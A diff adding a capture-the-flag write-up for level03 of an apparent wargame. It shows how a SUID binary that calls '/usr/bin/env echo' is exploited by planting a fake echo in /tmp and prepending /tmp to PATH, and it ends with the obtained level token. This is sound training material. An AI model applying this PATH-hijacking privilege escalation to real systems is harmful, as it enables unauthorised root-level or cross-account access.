@@ -1,0 +1,73 @@
+From the level03 account, the goal was to execute getflag with the privileges of the flag03 account.
+
+The home directory contained an executable file:
+
+level03
+
+I inspected its permissions:
+
+ls -la
+
+Interesting line:
+
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+The `s` bits show that the binary is SUID and SGID.
+The owner is flag03, so when this program runs, it can execute with flag03 privileges.
+
+I identified the file type:
+
+file level03
+
+Output:
+
+level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped
+
+I then inspected readable strings inside the binary:
+
+strings level03
+
+Important strings:
+
+system
+/usr/bin/env echo Exploit me
+
+This suggested that the program calls system() with this command:
+
+/usr/bin/env echo Exploit me
+
+I confirmed this with gdb by stopping before the system() call and inspecting the argument on the stack:
+
+x/s 0x080485e0
+
+Output:
+
+/usr/bin/env echo Exploit me
+
+The vulnerability is that `echo` is executed without an absolute path.
+`/usr/bin/env` is called with an absolute path, but it searches for `echo` using the PATH environment variable.
+
+Since PATH is controlled by the current user, I can put a writable directory at the beginning of PATH and create a fake `echo` executable there.
+
+I used /tmp because it is writable:
+
+cd /tmp
+echo '/bin/getflag' > echo
+chmod +x echo
+
+Then I put /tmp first in PATH:
+
+export PATH=/tmp:$PATH
+
+Finally, I ran the SUID binary:
+
+/home/user/level03/level03
+
+Instead of executing the real echo, `/usr/bin/env` found `/tmp/echo` first and executed it with flag03 privileges.
+The fake echo script ran:
+
+/bin/getflag
+
+Token obtained to access the next level:
+
+qi0maab88jeaj46qoumi7maus
